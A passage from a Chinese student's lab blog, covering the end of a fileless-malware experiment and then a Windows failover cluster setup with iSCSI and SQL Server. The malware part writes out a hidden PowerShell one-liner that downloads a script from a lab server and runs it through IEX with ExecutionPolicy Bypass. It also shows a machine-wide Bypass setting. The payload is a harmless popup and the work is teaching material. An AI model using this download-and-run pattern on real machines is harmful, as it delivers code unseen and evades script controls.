<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125232418586.png" class="" title="image-20241125232418586">
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h5 id="3-使用PowerShell远程下载并隐匿执行脚本"><a href="#3-使用PowerShell远程下载并隐匿执行脚本" class="headerlink" title="3. 使用PowerShell远程下载并隐匿执行脚本"></a>3. 使用PowerShell远程下载并隐匿执行脚本</h5><p><strong>实验步骤</strong></p>
<ol>
<li><p><strong>创建PowerShell脚本（远程下载测试脚本）</strong>：</p>
<ul>
<li><p>在远程服务器托管一个脚本文件（<code>test.ps1</code>），内容如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read-MessageBoxDialog</span></span> &#123;</span><br><span class="line">    <span class="variable">$PopUpWin</span> = <span class="built_in">new-object</span> <span class="literal">-comobject</span> wscript.shell</span><br><span class="line">    <span class="variable">$PopUpWin</span>.popup(<span class="string">&quot;Hello World, Welcome to School of Cybersecurity, GPNU!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Read-MessageBoxDialog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>修改当前会话的执行策略</strong></p>
<p>在 PowerShell 会话中临时修改执行策略（仅对当前会话有效）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Scope 参数：<ul>
<li><code>Process</code>：仅对当前会话生效，关闭会话后恢复默认。</li>
<li><code>CurrentUser</code>：仅对当前用户生效。</li>
<li><code>LocalMachine</code>：对所有用户生效（需要管理员权限）。</li>
</ul>
</li>
</ul>
<p><strong>永久修改执行策略（需慎重）</strong></p>
<p>如需永久更改执行策略，需使用以下命令（管理员权限）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> LocalMachine</span><br></pre></td></tr></table></figure>
<p>此命令将执行策略设置为 <strong>Bypass</strong>，本地脚本可执行，远程脚本需签名。</p>
</blockquote>
</li>
</ul>
</li>
<li><p><strong>使用PowerShell远程下载并执行脚本</strong>：</p>
<ul>
<li><blockquote>
<p><strong>选择部署的服务器</strong></p>
<ul>
<li>您可以使用以下方式部署服务器：<ul>
<li>使用本地的简单HTTP服务器（如Python的<code>http.server</code>）。</li>
<li>使用现有的Web服务器（如Apache、Nginx或IIS）。</li>
<li>使用云服务（如AWS、Azure）。</li>
</ul>
</li>
</ul>
<p><strong>部署简单HTTP服务器</strong></p>
<ul>
<li><p>如果在本地测试，可以使用Python内置的HTTP服务器。</p>
</li>
<li><p>在目标目录中（包含<code>test.ps1</code>文件）运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>说明</strong>：</p>
<ul>
<li><code>8080</code> 是 HTTP 服务使用的端口。</li>
<li><code>--bind 0.0.0.0</code> 表示服务器绑定到所有可用的网络接口</li>
</ul>
</li>
</ul>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235433743.png" class="" title="image-20241125235433743">
<h3 id="配置-Windows-防火墙"><a href="#配置-Windows-防火墙" class="headerlink" title="配置 Windows 防火墙"></a><strong>配置 Windows 防火墙</strong></h3><p>通过命令行打开防火墙的特定端口（如 8080）：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow Python HTTP&quot; <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
<ul>
<li>说明：<ul>
<li><code>name=&quot;Allow Python HTTP&quot;</code> 是规则名称，可以随意更改。</li>
<li><code>protocol=TCP</code> 指定协议类型为 TCP。</li>
<li><code>localport=8080</code> 指定开放的端口为 8080。</li>
</ul>
</li>
</ul>
<p><strong>删除规则</strong>（如果需要删除该规则）：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall delete rule name=&quot;Allow Python HTTP&quot;</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235419796.png" class="" title="image-20241125235419796">
<p><strong>确认服务器可用</strong></p>
<ul>
<li><p>使用浏览器访问：<code>http://&lt;服务器IP地址&gt;/gpnu.ps1</code>，确保能够下载<code>gpnu.ps1</code>脚本文件。</p>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235515664.png" class="" title="image-20241125235515664">
</li>
</ul>
</blockquote>
</li>
<li><p>在目标计算机执行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoProfile</span> <span class="literal">-NonInteractive</span> <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.236.0.54:8080/test.ps1&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235635819.png" class="" title="image-20241125235635819">
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235653052.png" class="" title="image-20241125235653052">
</li>
</ul>
</li>
<li><p><strong>隐匿执行</strong>：</p>
<ul>
<li>使用以下参数隐匿PowerShell窗口：<ul>
<li><code>-WindowStyle Hidden</code>：隐藏窗口。</li>
<li><code>-NoLogo</code>：不显示PowerShell启动标志。</li>
<li><code>-NonInteractive</code>：非交互模式执行。</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ol>
<li><p><strong>ADS数据流文件实验结果</strong>：</p>
<ul>
<li>成功创建并验证宿主文件附带的ADS数据流文件和独立的ADS数据流文件。</li>
<li>使用Notepad和WinHex验证ADS数据流的存在和内容。</li>
</ul>
</li>
<li><p><strong>PowerShell远程下载与隐匿执行实验结果</strong>：</p>
<ul>
<li>成功从远程服务器下载并隐匿执行<code>test.ps1</code>脚本，命令行无输出，脚本功能正常执行。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ol>
<li>无文件病毒因其无硬盘落地特性，使得基于文件的传统安全防护难以检测。</li>
<li>NTFS ADS和PowerShell提供了强大的隐匿能力，但也存在被恶意利用的风险。</li>
<li>在实际系统中，应通过强化执行策略（如限制PowerShell执行策略）、监控命令使用等手段提升安全性。</li>
</ol>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>确保实验环境为虚拟机，避免对生产系统产生影响。</li>
<li>远程脚本的服务器应具备HTTPS支持以避免被截获和篡改。</li>
</ul>
<hr>
<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><ol>
<li><strong>实验脚本与命令汇总</strong><ul>
<li>ADS创建命令。</li>
<li>PowerShell远程执行命令。</li>
</ul>
</li>
<li><strong>工具与参考文献</strong><ul>
<li>WinHex官方文档。</li>
<li>PowerShell命令参考。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">故障转移群集搭建与群集系统安装</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-03 08:46:58 / 修改时间：08:47:29" itemprop="dateCreated datePublished" datetime="2024-12-03T08:46:58+08:00">2024-12-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="故障转移群集搭建与群集系统安装"><a href="#故障转移群集搭建与群集系统安装" class="headerlink" title="故障转移群集搭建与群集系统安装"></a>故障转移群集搭建与群集系统安装</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
<li><strong>搭建故障转移群集</strong>：实现服务和应用程序的高可用性。</li>
<li><strong>群集系统安装环境设置</strong>：掌握搭建环境的配置要求。</li>
</ol>
<hr>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><ul>
<li><strong>操作环境</strong>:  <ul>
<li>Windows Server 2019  </li>
<li>SQL Server 2019</li>
</ul>
</li>
<li><strong>实验工具</strong>:  <ul>
<li>VMware</li>
</ul>
</li>
</ul>
<hr>
<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><h3 id="故障转移群集"><a href="#故障转移群集" class="headerlink" title="故障转移群集"></a><strong>故障转移群集</strong></h3><p>故障转移群集通过在多台服务器上部署相同的服务和应用程序，利用监控与自动切换机制，实现单点故障时的服务迁移，提高系统的可用性和容错能力。</p>
<h3 id="群集系统安装环境设置"><a href="#群集系统安装环境设置" class="headerlink" title="群集系统安装环境设置"></a><strong>群集系统安装环境设置</strong></h3><p>确保以下要求：</p>
<ul>
<li>服务器之间的网络连接正常。</li>
<li>操作系统兼容并满足群集系统要求。</li>
<li>硬件配置满足最低要求。</li>
<li>主机名和 IP 地址配置正确。</li>
</ul>
<h2 id="四、实验步骤与分析（调整后）"><a href="#四、实验步骤与分析（调整后）" class="headerlink" title="四、实验步骤与分析（调整后）"></a>四、实验步骤与分析（调整后）</h2><h3 id="（一）前期准备"><a href="#（一）前期准备" class="headerlink" title="（一）前期准备"></a>（一）前期准备</h3><h4 id="1-检查IP配置"><a href="#1-检查IP配置" class="headerlink" title="1. 检查IP配置"></a>1. 检查IP配置</h4><div class="table-container">
<table>
<thead>
<tr>
<th>节点</th>
<th>Public IP</th>
<th>Private IP</th>
<th>群集IP</th>
<th>域名</th>
<th>群集名</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server1</td>
<td>192.168.80.27</td>
<td>10.1.1.2</td>
<td>192.168.80.16</td>
<td>nodeA</td>
<td>moyu</td>
</tr>
<tr>
<td>Server2</td>
<td>192.168.80.32</td>
<td>10.1.1.3</td>
<td>192.168.80.16</td>
<td>nodeB</td>
<td>moyu</td>
</tr>
<tr>
<td>Master</td>
<td>192.168.80.82</td>
<td></td>
<td></td>
<td>ha.com</td>
<td></td>
</tr>
<tr>
<td>NAS</td>
<td>192.168.80.8</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="（二）使用-NAS-搭建共享存储"><a href="#（二）使用-NAS-搭建共享存储" class="headerlink" title="（二）使用 NAS 搭建共享存储"></a>（二）使用 NAS 搭建共享存储</h3><h4 id="1-创建-Zvol"><a href="#1-创建-Zvol" class="headerlink" title="1. 创建 Zvol"></a><strong>1. 创建 Zvol</strong></h4><ol>
<li><p><strong>添加 Zvol（块存储）</strong>：</p>
<ul>
<li>在 <code>node</code> 存储池下，点击右侧菜单，选择 <code>Add Zvol</code>。</li>
<li>分别创建以下 Zvol：<ul>
<li><code>Data</code>：大小为 3GB。</li>
<li><code>DTC</code>：大小为 1GB。</li>
<li><code>Zhongcai</code>：大小为 1GB。</li>
</ul>
</li>
<li>配置：<ul>
<li>设置名称和大小。</li>
<li>块大小（Block Size）保持默认（16KB 或 4KB）。</li>
</ul>
</li>
</ul>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126142018775.png" class="" title="image-20241126142018775">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143256927.png" class="" title="image-20241126143256927">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143409095.png" class="" title="image-20241126143409095">
</li>
<li><p><strong>启用 iSCSI 服务</strong>：</p>
<ul>
<li>转到 <code>服务 -&gt; iSCSI</code>，启用 iSCSI 服务。</li>
</ul>
</li>
</ol>
<h4 id="2-配置-iSCSI"><a href="#2-配置-iSCSI" class="headerlink" title="2. 配置 iSCSI"></a><strong>2. 配置 iSCSI</strong></h4><p>配置 iSCSI 以使节点（如 <code>NodeA</code> 和 <code>NodeB</code>）能够访问这些 Zvol。</p>
<ol>
<li><p><strong>创建扩展（Extent）</strong>：</p>
<ul>
<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 扩展</code>。</p>
</li>
<li><p><strong>操作</strong>：</p>
<ul>
<li>添加扩展：<ul>
<li>名称：<code>Data_Extent</code>、<code>DTC_Extent</code>、<code>Zhongcai_Extent</code>。</li>
<li>类型：选择 <code>Device</code>。</li>
<li>设备：选择您创建的 Zvol（如 <code>Data</code>）。</li>
</ul>
</li>
</ul>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143543203.png" class="" title="image-20241126143543203">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143653648.png" class="" title="image-20241126143653648">
</li>
</ul>
</li>
<li><p><strong>创建目标（Target）</strong>：</p>
<ul>
<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 目标</code>。</p>
</li>
<li><p><strong>操作</strong>：</p>
<ul>
<li>添加目标：<ul>
<li>名称：<code>datatarget</code>、<code>dtctarget</code>、<code>zhongcaitarget</code>。</li>
<li>授权：选择 <code>None</code> 或配置 CHAP 验证。</li>
<li>Portal Group和发起人组ID均设为1</li>
</ul>
</li>
</ul>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144320531.png" class="" title="image-20241126144320531">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144048879.png" class="" title="image-20241126144048879">
</li>
</ul>
</li>
<li><p><strong>关联扩展和目标</strong>（Associated Targets）：</p>
<ul>
<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 关联</code>。</p>
</li>
<li><p><strong>操作</strong>：</p>
<ul>
<li>将每个扩展与相应的目标关联,LUN ID设为1。</li>
</ul>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144459126.png" class="" title="image-20241126144459126">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144814424.png" class="" title="image-20241126144814424">
</li>
</ul>
</li>
<li><p>返回 <strong>Target Global Configuration</strong>，保存配置并启用iSCSI服务。</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144910040.png" class="" title="image-20241126144910040">
</li>
</ol>
<h4 id="3-在节点（NodeA-和-NodeB）上配置-iSCSI"><a href="#3-在节点（NodeA-和-NodeB）上配置-iSCSI" class="headerlink" title="3. 在节点（NodeA 和 NodeB）上配置 iSCSI"></a><strong>3. 在节点（NodeA 和 NodeB）上配置 iSCSI</strong></h4><ol>
<li><p><strong>启动 iSCSI 发起程序</strong>：</p>
<ul>
<li>在 <code>NodeA</code> 和 <code>NodeB</code> 上，搜索并打开 <strong>iSCSI 发起程序</strong>。</li>
</ul>
</li>
<li><p><strong>发现 FreeNAS iSCSI 目标</strong>：</p>
<ul>
<li>在 iSCSI 发起程序中：<ul>
<li>添加门户：输入 FreeNAS 的 IP 地址。</li>
<li>搜索并发现所有配置的 iSCSI 目标。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>连接磁盘</strong>：</p>
<ul>
<li>在磁盘管理器中初始化新发现的磁盘。</li>
<li>将磁盘格式化为 NTFS 或其他适用文件系统。</li>
</ul>
</li>
</ol>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145234120.png" class="" title="image-20241126145234120">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145256593.png" class="" title="image-20241126145256593">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145321873.png" class="" title="image-20241126145321873">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145653788.png" class="" title="image-20241126145653788">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145829756.png" class="" title="image-20241126145829756"><img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126150016926.png" class="" title="image-20241126150016926">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126150241902.png" class="" title="image-20241126150241902">
<h4 id="4-在群集管理器中挂载磁盘"><a href="#4-在群集管理器中挂载磁盘" class="headerlink" title="4. 在群集管理器中挂载磁盘"></a><strong>4. 在群集管理器中挂载磁盘</strong></h4><ul>
<li><p>打开 Windows 故障转移群集管理器。</p>
</li>
<li><p>添加新的存储，并验证 <code>Data</code>、<code>DTC</code> 和 <code>Zhongcai</code> 能否正确被群集节点访问。</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151249724.png" class="" title="image-20241126151249724">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151342115.png" class="" title="image-20241126151342115">
</li>
</ul>
<hr>
<h3 id="（四）配置群集仲裁"><a href="#（四）配置群集仲裁" class="headerlink" title="（四）配置群集仲裁"></a>（四）配置群集仲裁</h3><ol>
<li>在“故障转移群集管理器”中，配置仲裁方式。</li>
<li>选择“磁盘见证”方式，指定 <code>Zhongcai</code> 磁盘。</li>
</ol>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151708977.png" class="" title="image-20241126151708977">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151808851.png" class="" title="image-20241126151808851">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151824658.png" class="" title="image-20241126151824658">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151849064.png" class="" title="image-20241126151849064">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152431842.png" class="" title="image-20241126152431842">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152504157.png" class="" title="image-20241126152504157">
<hr>
<h3 id="（五）添加-DTC-角色"><a href="#（五）添加-DTC-角色" class="headerlink" title="（五）添加 DTC 角色"></a>（五）添加 DTC 角色</h3><ol>
<li>在“故障转移群集管理器”中，添加分布事务协调器 (DTC) 角色。</li>
<li>指定 DTC 角色的磁盘为 <code>DTC</code>，IP 地址为 192.168.80.20。</li>
</ol>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152929156.png" class="" title="image-20241126152929156">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152951746.png" class="" title="image-20241126152951746">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153114137.png" class="" title="image-20241126153114137">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153154932.png" class="" title="image-20241126153154932">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153215366.png" class="" title="image-20241126153215366">
<hr>
<h3 id="（六）安装-SQL-Server-故障转移"><a href="#（六）安装-SQL-Server-故障转移" class="headerlink" title="（六）安装 SQL Server 故障转移"></a>（六）安装 SQL Server 故障转移</h3><h4 id="在NodeA-上安装-SQL-Server"><a href="#在NodeA-上安装-SQL-Server" class="headerlink" title="在NodeA  上安装 SQL Server"></a><strong>在NodeA  上安装 SQL Server</strong></h4><p>打开 SQL Server <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Y9WDkIpm9Xbv2mFKbbOnpQ?pwd=ujf4">安装程序</a>，选择 <strong>“新的 SQL Server 故障转移群集安装”</strong>。双击iso ==》setup，然后右侧选择【新的 SOL Server 故障转移群集安装】</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127111859030.png" class="" title="image-20241127111859030">
